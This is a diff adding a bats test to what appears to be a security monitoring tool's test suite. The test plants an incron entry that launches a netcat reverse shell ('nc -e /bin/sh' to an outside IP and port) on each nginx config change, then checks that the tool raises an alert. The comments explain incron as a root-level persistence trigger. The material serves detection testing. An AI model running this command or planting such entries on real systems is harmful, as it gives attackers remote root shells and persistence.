@@ -237,3 +237,20 @@ seed_benign() {
     run_wd
     cap | grep -q '"severity":"alert"'
 }
+
+@test "INVARIANT (nc reverse-shell variant in incron command: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
+    # Sister to the brain-wide nc reverse-shell variant INVARIANT
+    # family already locked. incron runs commands AS ROOT (system
+    # tables) or AS THE USER (user tables) on every matching inotify
+    # event (T1546 — Event Triggered Execution). Attacker may plant
+    # an inotify watch on a routinely-modified file to fire the
+    # callback as a recurring exec trigger. Locks the netcat axis on
+    # the inotify-event-trigger root-exec persistence surface
+    # alongside the other reverse-shell variants.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '/etc/nginx IN_MODIFY nc -e /bin/sh 1.1.1.1 4444\n' > "${TAB}"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
